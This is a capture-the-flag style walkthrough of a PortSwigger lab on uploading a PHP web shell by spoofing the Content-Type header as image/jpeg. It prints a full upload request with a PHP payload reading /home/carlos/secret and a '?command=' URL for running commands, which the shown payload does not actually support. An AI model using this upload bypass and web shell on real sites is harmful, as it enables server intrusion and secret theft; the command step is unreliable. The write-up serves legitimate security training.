## Lab Description: Web shell upload via Content-Type restriction bypas

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/2acd0384-5eb8-4bbb-89d3-39fa6d909f45)

## Solution:  

One way that websites may attempt to validate file uploads is to check that this input-specific Content-Type header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like image/jpeg and image/png.
Problems can arise when the value of this header is implicitly trusted by the server.,if no further validation is performed to check whether the contents of the file actually match the supposed MIME type.

Log in as wiener & we will be presented with a page to update email and also to upload an avatar.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/381ce4ab-a80f-44ac-ac2b-8cf1112a2e13)

When we upload .jpg file we get No error and successfully file is uploaded

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b40adc98-ea75-4c94-b9a6-e035c67399c5)

When we upload a .php file with the payload , we get this response stating that the application accepts only .jpeg files.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/0b61f421-e3ed-4e78-99c5-3118128af04a)

```

POST /my-account/avatar HTTP/2
Host: 0a3000a9037af72880157631004c00da.web-security-academy.net
Cookie: session=EFoobh8j7a93NMehMgQ8vxBRFnfw9pLo
Content-Length: 474
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3000a9037af72880157631004c00da.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryneB09X1nkJjKArg7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3000a9037af72880157631004c00da.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

------WebKitFormBoundaryneB09X1nkJjKArg7
Content-Disposition: form-data; name="avatar"; filename="virus.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryneB09X1nkJjKArg7
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryneB09X1nkJjKArg7
Content-Disposition: form-data; name="csrf"

wfVqoyKHLdFDWotDbQJDypTlytmUQgEt
------WebKitFormBoundaryneB09X1nkJjKArg7--
```
So let's change the Content-Type: application/x-php to Content-Type: image/jpeg & see what happens.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/5055472c-243a-4c70-ac60-d74438c7110e)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e92effe7-077b-484e-bcb6-a5ff551bc895)

Now the file is successfully uploaded.

Now we can run comands on the server by using the ?command= parameter. ie - `/files/avatars/file.php?command=cat /home/carlos/secret`

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/62a7f80e-2950-4ab6-80d6-45e69c4d28f0)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/2cec0a53-3ccc-4212-9f47-c8af84976ce0)





